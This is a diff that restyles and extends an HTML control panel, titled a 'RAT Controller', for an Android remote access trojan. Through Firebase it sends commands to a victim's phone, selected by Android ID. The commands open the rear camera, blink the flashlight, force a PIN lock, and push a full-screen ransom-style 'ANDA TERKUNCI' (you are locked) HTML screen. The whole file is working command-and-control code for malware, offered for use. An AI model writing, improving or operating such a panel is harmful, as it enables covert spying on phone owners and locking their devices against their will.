@@ -1,26 +1,208 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
     <title>RAT Controller - Prof Xch</title>
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js">
+    </script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js">
+    </script>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            background: #0d0f1c;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: #e0e6f0;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .card {
+            max-width: 700px;
+            width: 100%;
+            background: #1a1f2e;
+            border-radius: 24px;
+            padding: 30px 25px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.7);
+            border: 1px solid #2a3346;
+        }
+        h1 {
+            font-size: 28px;
+            color: #00e5ff;
+            text-align: center;
+            margin-bottom: 8px;
+            letter-spacing: 1px;
+            text-shadow: 0 0 10px #00e5ff44;
+        }
+        .sub {
+            text-align: center;
+            color: #8a94a6;
+            font-size: 14px;
+            margin-bottom: 28px;
+            border-bottom: 1px solid #2a3346;
+            padding-bottom: 16px;
+        }
+        label {
+            display: block;
+            font-weight: 500;
+            margin-top: 18px;
+            margin-bottom: 6px;
+            color: #b0c0d4;
+        }
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px 16px;
+            background: #10141f;
+            border: 1px solid #2e3a4f;
+            border-radius: 12px;
+            color: #fff;
+            font-size: 16px;
+            outline: none;
+            transition: 0.2s;
+        }
+        input:focus {
+            border-color: #00e5ff;
+            box-shadow: 0 0 0 3px #00e5ff22;
+        }
+        .btn-group {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            margin: 16px 0 10px;
+        }
+        .btn {
+            flex: 1 1 auto;
+            padding: 12px 20px;
+            background: #242c3f;
+            border: none;
+            border-radius: 12px;
+            color: #fff;
+            font-weight: 600;
+            font-size: 15px;
+            cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            min-width: 120px;
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+            filter: brightness(1.2);
+        }
+        .btn-primary {
+            background: #0078ff;
+        }
+        .btn-danger {
+            background: #dc3545;
+        }
+        .btn-success {
+            background: #28a745;
+        }
+        .btn-warning {
+            background: #ffc107;
+            color: #1a1f2e;
+        }
+        .btn-purple {
+            background: #6f42c1;
+        }
+        .btn-cyan {
+            background: #17a2b8;
+        }
+        hr {
+            border: none;
+            border-top: 1px solid #2a3346;
+            margin: 24px 0;
+        }
+        textarea {
+            width: 100%;
+            background: #10141f;
+            border: 1px solid #2e3a4f;
+            border-radius: 12px;
+            color: #d0dbe8;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            padding: 12px;
+            resize: vertical;
+            min-height: 100px;
+            outline: none;
+        }
+        textarea:focus {
+            border-color: #6f42c1;
+        }
+        .info {
+            font-size: 13px;
+            color: #8a94a6;
+            margin-top: 12px;
+        }
+        .status {
+            background: #10141f;
+            border-radius: 12px;
+            padding: 12px 16px;
+            margin: 16px 0 8px;
+            border-left: 4px solid #00e5ff;
+            font-size: 14px;
+            color: #b0c0d4;
+        }
+        .status.success {
+            border-left-color: #28a745;
+        }
+        .status.error {
+            border-left-color: #dc3545;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #5a647a;
+        }
+    </style>
 </head>
-<body style="font-family: monospace; background: #111; color: #0f0; padding: 20px;">
-    <h1>🔥 TUMBAL CONTROLLER [Prof Xch]</h1>
-    <label>Device ID (Android ID): <input id="deviceId" style="width:300px;" placeholder="Masukkan ANDROID_ID"></label><br><br>
-    <button onclick="sendCmd('camera_rear')">📷 Kamera Belakang (Preview 10s)</button>
-    <button onclick="sendCmd('flash_blink')">💡 Senter Kedip 900ms (Toggle)</button>
-    <br><br>
-    <label>PIN (min 4): <input id="pinInput" placeholder="1234"></label>
-    <button onclick="sendLockPin()">🔒 Lock PIN</button>
-    <hr>
-    <h3>📄 Lock Custom HTML (Auto dismiss 24 Jam)</h3>
-    <textarea id="htmlInput" rows="6" cols="50"><h1 style='color:red;'>ANDA TERKUNCI</h1><button onclick='AndroidLock.dismissLock()' style='font-size:30px;'>SELESAI</button></textarea><br>
-    <button onclick="sendCustomHtml()">🚀 Kirim HTML Lock</button>
-    <p style="color:red;">* Jika HTML tidak dismiss, akan hilang sendiri setelah 24 jam.</p>
+<body>
+
+    <div class="card">
+        <h1>⚡ TUMBAL CONTROLLER</h1>
+        <div class="sub">🔐 by Prof Xch · JetGPT</div>
+
+        <!-- Device ID -->
+        <label>📱 Device ID (Android ID)</label>
+        <input type="text" id="deviceId" placeholder="Masukkan ANDROID_ID" />
+        <div id="statusMsg" class="status">⏳ Menunggu perintah...</div>
+
+        <!-- Tombol fitur -->
+        <div class="btn-group">
+            <button class="btn btn-cyan" onclick="sendCmd('camera_rear')">📷 Kamera Belakang</button>
+            <button class="btn btn-warning" onclick="sendCmd('flash_blink')">💡 Senter Kedip</button>
+        </div>
+
+        <div style="margin: 10px 0;">
+            <label>🔒 Lock PIN (min 4 digit)</label>
+            <div style="display:flex; gap:10px;">
+                <input type="password" id="pinInput" placeholder="1234" style="flex:2;" />
+                <button class="btn btn-danger" onclick="sendLockPin()" style="flex:1;">Lock PIN</button>
+            </div>
+        </div>
+
+        <hr />
+
+        <label>📄 Lock Custom HTML (auto dismiss 24 jam)</label>
+        <textarea id="htmlInput"><h1 style='color:red;text-align:center;'>ANDA TERKUNCI</h1><button onclick='AndroidLock.dismissLock()' style='font-size:30px;display:block;margin:auto;'>SELESAI</button></textarea>
+        <button class="btn btn-purple" onclick="sendCustomHtml()" style="width:100%;margin-top:10px;">🚀 Kirim HTML Lock</button>
+        <div class="info">* Jika HTML tidak dismiss, akan hilang sendiri setelah 24 jam.</div>
+
+        <div class="footer">© 2026 · Dibuat untuk Prof Xch</div>
+    </div>
 
     <script>
-        // ==== GANTI DENGAN CONFIG DARI FIREBASE WEB ANDA ====
+        // ========== GANTI DENGAN FIREBASE CONFIG ASLI ==========
         const firebaseConfig = {
             apiKey: "AIzaSy.......", // GANTI
             authDomain: "xxxx.firebaseapp.com",
@@ -30,27 +212,64 @@
             messagingSenderId: "123456",
             appId: "1:123456:web:abcdef"
         };
+        // =====================================================
+
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
-        function getDeviceId() { return document.getElementById('deviceId').value; }
+        function getDeviceId() {
+            return document.getElementById('deviceId').value.trim();
+        }
+
+        function setStatus(msg, isError = false) {
+            const el = document.getElementById('statusMsg');
+            el.textContent = msg;
+            el.className = 'status ' + (isError ? 'error' : 'success');
+        }
 
         function sendCmd(type, payload = {}) {
             const id = getDeviceId();
-            if(!id) return alert('Masukkan Device ID!');
-            db.ref('commands/' + id).set({ type, ...payload, timestamp: Date.now() });
+            if (!id) {
+                setStatus('❌ Masukkan Device ID!', true);
+                return;
+            }
+            setStatus('⏳ Mengirim perintah...', false);
+            db.ref('commands/' + id).set({ type, ...payload, timestamp: Date.now() })
+                .then(() => {
+                    setStatus('✅ Perintah ' + type + ' berhasil dikirim!');
+                })
+                .catch(err => {
+                    console.error(err);
+                    setStatus('❌ Gagal kirim: ' + err.message, true);
+                });
         }
 
         function sendLockPin() {
             const pin = document.getElementById('pinInput').value;
-            if(pin.length < 4) return alert('Min 4 digit');
+            if (pin.length < 4) {
+                setStatus('❌ PIN minimal 4 digit', true);
+                return;
+            }
             sendCmd('lock_pin', { pin: pin });
         }
 
         function sendCustomHtml() {
             const html = document.getElementById('htmlInput').value;
+            if (!html) {
+                setStatus('❌ HTML tidak boleh kosong', true);
+                return;
+            }
             sendCmd('lock_html', { html: html });
         }
+
+        // Listen untuk status koneksi Firebase
+        db.ref('.info/connected').on('value', (snap) => {
+            if (snap.val() === true) {
+                setStatus('🟢 Terhubung ke Firebase');
+            } else {
+                setStatus('🔴 Tidak terhubung ke Firebase. Periksa konfigurasi.', true);
+            }
+        });
     </script>
 </body>
 </html>
